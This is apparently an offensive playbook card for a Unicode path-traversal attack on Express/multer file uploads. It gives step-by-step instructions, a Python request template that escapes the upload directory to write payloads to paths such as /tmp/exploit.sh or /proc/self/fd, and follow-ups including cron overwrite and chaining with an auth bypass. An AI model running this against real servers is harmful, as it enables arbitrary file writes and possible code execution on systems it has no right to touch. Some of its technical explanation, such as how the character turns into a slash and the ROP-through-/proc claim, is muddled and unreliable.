---
name: multer_unicode_path_traversal
vuln_type: path_traversal
sub_technique: unicode_encoding_bypass
category: exploitation
safety_level: dangerous
tags:
- path-traversal
- multer
- unicode
- file-upload
- nodejs
- encoding
---

# Multer Latin1→Utf8 Unicode Path Traversal (丯 = /)

## When to Apply

Express + multer file upload converts filename via `Buffer.from(name, 'latin1').toString('utf-8')` and uses the result directly in the `diskStorage` filename callback. Sending Unicode character `丯` (U+4E2F, UTF-8: E4 B8 AF) via RFC5987 `filename*=UTF-8''...` encoding causes the latin1→utf8 conversion to produce `/` in the OS path, escaping the upload directory.

## Prerequisites

- multer diskStorage in use (memory storage does not write files)
- filename callback uses `file.originalname` directly without path.basename()
- latin1→utf8 conversion logic exists (added in some multer configs for CJK filename support)
- Account with upload permissions needed (e.g. guide/admin — combine with separate auth bypass)

## Steps

1. Verify the upload endpoint and multer config (diskStorage + filename callback)
2. Confirm `Buffer.from(name, 'latin1').toString('utf-8')` conversion is present
3. Use RFC5987 encoding in the multipart form:
   `Content-Disposition: form-data; name="image"; filename*=UTF-8''..%E4%B8%AF..%E4%B8%AF...target`
   `..丯` equals `../` (丯's UTF-8 E4 B8 AF → interpreted as latin1 → utf8 → `/`)
4. Traversal depth: repeat `..丯` enough times to escape to root (~13 times)
5. Write payload to target path (e.g. `/proc/self/fd/N`, `/tmp/exploit.sh`)
6. Follow-up: manipulate Node process memory via /proc/self/fd/ (ROP) or overwrite cron/script

## Code Template

```
from urllib.parse import quote
import requests

traversal = '..丯' * 13 + '{target_path}'.replace('/', '丯')
fn_rfc = "UTF-8''" + quote(traversal)
boundary = '----Exploit'
body = f'--{{boundary}}\r\n'
body += f'Content-Disposition: form-data; name="image"; filename*={{fn_rfc}}\r\n'
body += 'Content-Type: application/octet-stream\r\n\r\n'
body = body.encode('utf-8') + {payload_bytes} + f'\r\n--{{boundary}}--\r\n'.encode('utf-8')
r = session.put(f'{{TARGET}}/api/answers/{{uuid}}', data=body,
                headers={{'Content-Type': f'multipart/form-data; boundary={{boundary}}'}})
```

## Examples

### Example 1

- **endpoint**: PUT /api/answers/:uuid (multer upload.single('image'))
- **encoding_line**: file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf-8')
- **unicode_char**: 丯 (U+4E2F)
- **traversal_target**: /proc/self/fd/N (ROP) or /tmp/ (arbitrary write)

After obtaining privileges via auth bypass, use multer upload for path traversal. Writing ROP payload to /proc/self/fd/ can crash the Node process → execve possible.
